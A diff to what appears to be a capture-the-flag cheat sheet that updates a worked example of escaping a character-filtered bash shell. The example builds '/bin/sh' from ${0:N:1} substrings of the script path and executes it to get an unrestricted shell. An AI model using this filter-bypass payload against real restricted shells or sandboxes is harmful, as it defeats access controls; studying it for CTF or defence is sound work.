@@ -178,12 +178,12 @@ When only digits, `${}/:?"&>_=()` are allowed (no letters, no `\`), use `${0:N:1
    ```
 2. **Map character positions** — extract chars you need (e.g., b, i, n, s, h for `/bin/sh`):
    ```bash
-   # If $0 = /home/restricted_user/broken_shell.sh:
-   # b at pos 22, i at 11, n at 27, s at 8, h at 30
+   # If $0 = /home/ctf/bin_shell.sh:
+   # b at pos 10, i at 11, n at 12, s at 14, h at 15
    ```
 3. **Construct and execute** — double-quoted string expands then executes as command:
    ```bash
-   "${0:0:1}${0:22:1}${0:11:1}${0:27:1}${0:0:1}${0:8:1}${0:30:1}"
+   "${0:0:1}${0:10:1}${0:11:1}${0:12:1}${0:0:1}${0:14:1}${0:15:1}"
    # → /bin/sh → spawns unrestricted shell; subsequent stdin bypasses parent filter
    ```
 
